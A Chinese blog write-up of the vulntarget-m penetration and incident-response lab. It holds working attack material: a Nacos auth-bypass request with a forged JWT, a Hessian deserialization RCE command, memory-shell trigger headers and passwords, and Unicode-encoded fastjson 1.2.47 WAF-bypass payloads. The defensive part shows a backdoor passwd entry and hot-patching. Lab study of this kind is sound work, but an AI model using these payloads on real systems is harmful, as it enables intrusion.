<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>vulntarget-m | MssnHarvey</title><meta name="author" content="Harvey"><meta name="copyright" content="Harvey"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言 拓扑   入口机为双网卡，外网可以根据自身情况，设置桥接或nat模式，内网ip固定位192.168.137.20 内网机02为仅主机模式，ip固定位192.168.137.10，该ip不能变更。 内网机03为仅主机模式，ip固定位192.168.137.30  三台机子的账号密码均为vulntarget，该密码仅限调试环境使用，并不是给你用来应急的，应急需要从漏洞打进去才能应急   注意事项">
<meta property="og:type" content="article">
<meta property="og:title" content="vulntarget-m">
<meta property="og:url" content="https://mssnharvey.github.io/2024/10/27/vulntarget-m/index.html">
<meta property="og:site_name" content="MssnHarvey">
<meta property="og:description" content="前言 拓扑   入口机为双网卡，外网可以根据自身情况，设置桥接或nat模式，内网ip固定位192.168.137.20 内网机02为仅主机模式，ip固定位192.168.137.10，该ip不能变更。 内网机03为仅主机模式，ip固定位192.168.137.30  三台机子的账号密码均为vulntarget，该密码仅限调试环境使用，并不是给你用来应急的，应急需要从漏洞打进去才能应急   注意事项">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://mssnharvey.github.io/imgs/vulntarget-m.jpg">
<meta property="article:published_time" content="2024-10-27T14:03:25.000Z">
<meta property="article:modified_time" content="2026-02-09T11:38:36.143Z">
<meta property="article:author" content="Harvey">
<meta property="article:tag" content="vulntarget">
<meta property="article:tag" content="内存马">
<meta property="article:tag" content="应急响应">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://mssnharvey.github.io/imgs/vulntarget-m.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "vulntarget-m",
  "url": "https://mssnharvey.github.io/2024/10/27/vulntarget-m/",
  "image": "https://mssnharvey.github.io/imgs/vulntarget-m.jpg",
  "datePublished": "2024-10-27T14:03:25.000Z",
  "dateModified": "2026-02-09T11:38:36.143Z",
  "author": [
    {
      "@type": "Person",
      "name": "Harvey",
      "url": "https://mssnharvey.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/l1.jpg"><link rel="canonical" href="https://mssnharvey.github.io/2024/10/27/vulntarget-m/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'medium_zoom',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'vulntarget-m',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw fas fa-comments"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/../imgs/vulntarget-m.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">MssnHarvey</span></a><a class="nav-page-title" href="/"><span class="site-name">vulntarget-m</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw fas fa-comments"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">vulntarget-m</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-27T14:03:25.000Z" title="发表于 2024-10-27 22:03:25">2024-10-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-09T11:38:36.143Z" title="更新于 2026-02-09 19:38:36">2026-02-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/">靶场通关</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">4.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>21分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><ol>
<li><strong>拓扑</strong></li>
</ol>
<ul>
<li>入口机为双网卡，外网可以根据自身情况，设置桥接或<code>nat</code>模式，内网<code>ip</code>固定位<code>192.168.137.20</code></li>
<li>内网机<code>02</code>为仅主机模式，<code>ip</code>固定位<code>192.168.137.10</code>，<strong>该ip不能变更</strong>。</li>
<li>内网机<code>03</code>为仅主机模式，<code>ip</code>固定位<code>192.168.137.30</code></li>
</ul>
<p>三台机子的账号密码均为vulntarget，该密码仅限调试环境使用，并不是给你用来应急的，应急需要从漏洞打进去才能应急</p>
<p><img src="/../imgs/vulntarget-m1.PNG"></p>
<ol>
<li><strong>注意事项</strong></li>
</ol>
<p>本次环境<code>vulntarget-m</code>内网靶场主要为内网渗透+应急响应设定，其中应急部分主要涉及<code>java</code>内存马、后门等，因为在靶标中含有多个内存马，所以您在本地使用<code>Vmware</code>复现该环境时，<strong>只能够通过回滚快照的方法来重置环境，不能够将环境直接重启，重启会导致内存马失效。</strong></p>
<p>同样因为内存马的特殊性，可能会导致在攻防时出现一些问题，例如在注入内存马时因为路径问题、类型问题导致的覆盖、冲突等，这时可能需要多次尝试。</p>
<ol>
<li><strong>环境描述</strong></li>
</ol>
<p>某公司将自己公司的业务搬到了云上，并存在内网服务，公司运维人员主要通过远程<code>ssh</code>登录入口机，对服务进行日常维护和管理。</p>
<p>在前段时间，某国外黑客发现该公司的入口机存在漏洞，并入侵了该机器，同时可能入侵了内网系统。</p>
<p>运维在今日登录维护的时候，发现<code>ssh</code>无法登录，经过排查发现<code>ssh</code>密码目前已经被修改。</p>
<p>由于环境特殊，暂时无法通过其他的方法对机器进行重置密码，且由于业务的重要性，不能够对服务器进行重启等。</p>
<p>根据以上条件：</p>
<p>请利用先攻再应急的特殊思维方法来进行应急。</p>
<ol>
<li><strong>任务目标</strong></li>
</ol>
<ul>
<li>对<code>3</code>台机器进行应急排查，对其中可能的后门进行排查</li>
<li>不能够重启机器（重启则判定应急失败）</li>
<li>在你认为应急成功之后，请获取对应的<code>flag</code>，并对你获取的<code>flag</code>进行<code>check</code></li>
</ul>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h2><p>扫描存活主机和端口，发现开放了22、80、7848、8848、9848、9849端口</p>
<p><img src="/../imgs/vulntarget-m2.PNG"></p>
<p>访问80端口界面如下：</p>
<p><img src="/../imgs/vulntarget-m3.PNG"></p>
<p>存在一个登录口，经典fastjson靶机界面</p>
<p><img src="/../imgs/vulntarget-m4.png"></p>
<p>然后看7848、8848这几个端口应该就是nacos服务，直接请求8848端口是它的Web控制台如下：</p>
<p><img src="/../imgs/vulntarget-m5.png"></p>
<h2 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a><strong>web打点</strong></h2><h3 id="Nacos-Hessian-反序列化"><a href="#Nacos-Hessian-反序列化" class="headerlink" title="Nacos Hessian 反序列化"></a><strong>Nacos Hessian 反序列化</strong></h3><p>可利用Nacos身份绕过漏洞登录后台，后台可以得到一些配置信息，如shiro key</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /nacos/v1/auth/users/login HTTP/1.1</span><br><span class="line">Host: 192.168.230.132:8848</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 31</span><br><span class="line">Origin: http://192.168.230.132:8848</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.230.132:8848/nacos/index.html</span><br><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6IjE2OTcyMDU2MDAifQ.TFQnTkHxhNqYlo8c2kuluaoVkEcngSzgS08vjUjJaOs</span><br><span class="line"></span><br><span class="line">username=najcos&amp;password=nacjos</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/vulntarget-m6.png"></p>
<p>接着尝试Nacos Hessian 反序列化漏洞利用成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar NacosRce.jar http://192.168.230.128:8848/nacos/ 7848 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/vulntarget-m7.png"></p>
<blockquote>
<p>一、冰蝎内存马： 1、需要设置请求头x-client-data:rebeyond 2、设置Referer:<a target="_blank" rel="noopener" href="https://www.google.com/">https://www.google.com/</a> 3、路径随意 4、密码rebeyond</p>
<p>二、哥斯拉内存马： 1、需要设置请求头x-client-data:godzilla 2、设置Referer:<a target="_blank" rel="noopener" href="https://www.google.com/">https://www.google.com/</a> 3、路径随意 4、密码是pass 和 key</p>
<p>三、CMD内存马： 1、需要设置请求头x-client-data:cmd 2、设置Referer:<a target="_blank" rel="noopener" href="https://www.google.com/">https://www.google.com/</a> 3、请求头cmd:要执行的命令</p>
</blockquote>
<p>这里有个问题，用冰蝎始终连不上，可能这同时注入内存马出bug了</p>
<p><img src="/../imgs/vulntarget-m8.png"></p>
<p>换成哥斯拉就成功连上了</p>
<p><img src="/../imgs/vulntarget-m9.png"></p>
<p><img src="/../imgs/vulntarget-m10.png"></p>
<h3 id="应急响应Ⅰ"><a href="#应急响应Ⅰ" class="headerlink" title="应急响应Ⅰ"></a><strong>应急响应Ⅰ</strong></h3><blockquote>
<p>线索：运维在今日登录维护的时候，发现<code>ssh</code>无法登录，经过排查发现<code>ssh</code>密码目前已经被修改。</p>
</blockquote>
<p>查看passwd和shadow文件，在passwd文件中可以发现<code>bt</code>用户给出的用户内容格式是个不寻常的格式，通常不会在正常用户中出现（正常的用户应该包含用户名、经过加密的密码哈希值、以及其他相关的用户信息）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bt:adrla7IBSfTZQ:0:0:eval_to_root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/vulntarget-m11.png"></p>
<p><img src="/../imgs/vulntarget-m12.png"></p>
<p>接着我们发现异常用户<code>bt</code>曾经登陆过，还是个特权用户</p>
<p><img src="/../imgs/vulntarget-m13.png"></p>
<p><img src="/../imgs/vulntarget-m14.png"></p>
<p>于是删除<code>bt</code>用户（回显用户不存在我还以为失败了</p>
<p><img src="/../imgs/vulntarget-m15.png"></p>
<p>应急成功，拿下flag1：flag{6c3742aaf26a6dea7fe9d7731de59517}</p>
<p><img src="/../imgs/vulntarget-m16.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">who     查看当前登录用户（tty本地登陆  pts远程登录）</span><br><span class="line">w       查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">uptime  查看登陆多久、多少用户，负载</span><br><span class="line"></span><br><span class="line">1、查询特权用户特权用户(uid 为0)</span><br><span class="line">awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line"></span><br><span class="line">2、查询可以远程登录的帐号信息</span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line"></span><br><span class="line">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br><span class="line"></span><br><span class="line">4、禁用或删除多余及可疑的帐号</span><br><span class="line">usermod -L user    禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头</span><br><span class="line">userdel user       删除user用户</span><br><span class="line">userdel -r user    将删除user用户，并且将/home目录下的user目录一并删除</span><br><span class="line"></span><br><span class="line">5、root的历史命令</span><br><span class="line">histroy</span><br><span class="line"></span><br><span class="line">6、打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令</span><br><span class="line"></span><br><span class="line">为历史的命令增加登录的IP地址、执行命令时间等信息：</span><br><span class="line">1）保存1万条命令</span><br><span class="line">sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile</span><br><span class="line">2）在/etc/profile的文件尾部添加如下行数配置信息：</span><br><span class="line">######jiagu history xianshi#########</span><br><span class="line">USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`</span><br><span class="line">if [ &quot;$USER_IP&quot; = &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND=&quot;history -a&quot;</span><br><span class="line">######### jiagu history xianshi ##########</span><br><span class="line">3）source /etc/profile让配置生效</span><br><span class="line"></span><br><span class="line">生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</span><br><span class="line"></span><br><span class="line">7、历史操作命令的清除：history -c</span><br><span class="line">但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录。</span><br></pre></td></tr></table></figure>

<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a><strong>内网渗透</strong></h2><blockquote>
<p>代理配置搭建就忽略了~</p>
</blockquote>
<p>发现第二张网卡：192.168.137.20</p>
<p><img src="/../imgs/vulntarget-m17.png"></p>
<p>直接上fscan扫，发现存活IP：192.168.137.10和192.168.137.11</p>
<p><img src="/../imgs/vulntarget-m18.png"></p>
<p>接着再单独扫一下这两个IP，两个均开放了22和80端口</p>
<p><img src="/../imgs/vulntarget-m19.png"></p>
<p><img src="/../imgs/vulntarget-m20.png"></p>
<h3 id="shiro-CB链-反序列化"><a href="#shiro-CB链-反序列化" class="headerlink" title="shiro CB链 反序列化"></a><strong>shiro CB链 反序列化</strong></h3><p>192.168.137.11的80端口访问如下：</p>
<p><img src="/../imgs/vulntarget-m21.png"></p>
<p>抓包测试可以发现请求包的 <code>Set-Cookie</code> 中出现 <code>rememberMe=deleteMe</code>，说明存在shiro框架</p>
<p><img src="/../imgs/vulntarget-m22.png"></p>
<p>在前面nacos的配置文件中可以得到shiro的key</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#权限认证</span><br><span class="line">shiro:</span><br><span class="line">  enabled: true</span><br><span class="line">  set-login-uri: /login</span><br><span class="line">  key: KduO0i+zUIMcNNJnsZwU9Q==</span><br></pre></td></tr></table></figure>

<p>直接工具检测一下发现有可利用链</p>
<p><img src="/../imgs/vulntarget-m23.png"></p>
<p>成功注入内存马</p>
<p><img src="/../imgs/vulntarget-m24.png"></p>
<p><img src="/../imgs/vulntarget-m25.png"></p>
<h3 id="应急响应Ⅱ"><a href="#应急响应Ⅱ" class="headerlink" title="应急响应Ⅱ"></a><strong>应急响应Ⅱ</strong></h3><p>查看passwd和shadow文件，同样发现一个可疑用户<code>guest</code></p>
<p><img src="/../imgs/vulntarget-m26.png"></p>
<p><img src="/../imgs/vulntarget-m27.png"></p>
<p>接着再来查看系统日志、登录历史等信息，发现<code>guest</code>用户也在9.26登录过</p>
<p><img src="/../imgs/vulntarget-m28.png"></p>
<p>于是删除<code>guest</code>用户，并且执行get_flag检测失败</p>
<p><img src="/../imgs/vulntarget-m29.png"></p>
<p>接着在<code>/home/vulntarget</code>目录下找到可疑文件<code>app.jar</code>，下载下来反编译看一下即可确认就是这个文件有问题</p>
<p><img src="/../imgs/vulntarget-m30.png"></p>
<p>然后利用工具arthas实现内存马热更新</p>
<p>首先把jar包反编译导出后，将反编译有问题的地方修改下，再把<code>/bin/sh</code>给改一下让它不能执行</p>
<p><img src="/../imgs/vulntarget-m31.png"></p>
<p>接着分别将<code>arthas-boot.jar</code>和<code>arthas-tunnel-server-3.7.1-fatjar.jar</code>以及编译好后解压得到的<code>UserController.class</code>都上传到<code>/tmp</code>目录下，首次运行会出现如下报错：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java -jar arthas-boot.jar</span><br><span class="line"></span><br><span class="line">[ERROR] Can not read arthas version from: https://arthas.aliyun.com/api/latest_version</span><br><span class="line">[ERROR] Can not find Arthas under local: /root/.arthas/lib and remote repo mirror: center</span><br><span class="line">[ERROR] Unable to download arthas from remote server, please download the full package according to wiki: https://github.com/alibaba/arthas</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/vulntarget-m32.png"></p>
<p>这里需要在本地去执行一下，它会将<code>.arthas</code>保存在用户的隐藏文件下</p>
<p><img src="/../imgs/vulntarget-m33.png"></p>
<p>然后再把它打包上传，由于该靶机没有<code>unzip</code>，我们将其打包成tar包，在<code>/root</code>目录下上传并解压</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf arthas.tar .arthas</span><br><span class="line">tar -xvf arthas.tar</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/vulntarget-m34.png"></p>
<p><img src="/../imgs/vulntarget-m35.png"></p>
<p>解压后再去执行就可以成功进入Arthas工具中</p>
<p><img src="/../imgs/vulntarget-m36.png"></p>
<p>最后重新转换已加载的类文件实现热更新，再反编译这个类的源代码，可以发现修改成功了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">retransform /tmp/arthas/UserController.class</span><br><span class="line">jad --source-only com.example.shiro550.controller.UserController</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/vulntarget-m37.png"></p>
<p>应急成功，拿下flag2：flag{4b15f4d146ef4c128064f952ba11b874}</p>
<p><img src="/../imgs/vulntarget-m38.png"></p>
<h3 id="fastjson-c3p0链-二次序列化"><a href="#fastjson-c3p0链-二次序列化" class="headerlink" title="fastjson c3p0链 二次序列化"></a><strong>fastjson c3p0链 二次序列化</strong></h3><p>接着来看192.168.137.10的就是前面192.168.230.128的web登录页面，探测具体版本发现被拦截了</p>
<p><img src="/../imgs/vulntarget-m39.png"></p>
<p>PS: 前面拿burp的插件直接打bcel没成功应该也是被拦截了的缘故</p>
<p><img src="/../imgs/vulntarget-m40.png"></p>
<blockquote>
<p>利用Fastjson默认会去除键、值外的空格、\b、\n、\r、\f等特性，并且还会自动将键与值进行unicode与十六进制解码</p>
</blockquote>
<p>在fastjson中，当解析json字符串时，它会自动解码Unicode和hex编码字符。因此我们可以尝试利用该特征来实现编码绕过。我们先来尝试将利用报错回显来判断版本号的poc进行Unicode&#x2F;hex编码，可以看到这里抛出异常显示出fastjson版本号1.2.47，说明可以通过Unicode&#x2F;hex编码成功绕过waf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;</span><br><span class="line">// 编码前后</span><br><span class="line">&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.AutoCloseable&quot;</span><br><span class="line">&#123;&quot;\x40\x74\x79\x70\x65&quot;:&quot;java.lang.AutoCloseable&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/vulntarget-m41.png"></p>
<p><img src="/../imgs/vulntarget-m42.png"></p>
<p>或者拿yakit的插件可以检测到其版本为fastjson 1.2.47</p>
<p><img src="/../imgs/vulntarget-m43.png"></p>
<p>现在已知fastjson版本1.2.47，能打的链子就是bcel、c3p0和common-io链，并且测试可知是不出网的，jndi就不适用了，于是尝试利用Unicode编码绕过来打一下bcel，payload如下，tomcat那里需要换着测试</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/Getshell/Mshell/tree/main/03-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E6%88%98/01-Tomcat">https://github.com/Getshell/Mshell/tree/main/03-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E6%88%98/01-Tomcat</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;rand1&quot;: &#123; &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot; &#125;, &quot;rand2&quot;: &#123; &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;rand3&quot;: [&#123; &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;, &quot;driverClassLoader&quot;: &#123; &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;driverClassName&quot;: &quot;$$BCEL$$$……（内存马）&quot; &#125;,&#123;&quot;$ref&quot;:&quot;$[&#x27;rand3&#x27;].connection&quot;&#125;] &#125;</span><br><span class="line">Tomcat 8.0以上，org.apache.tomcat.dbcp.dbcp2.BasicDataSource</span><br><span class="line">Tomcat 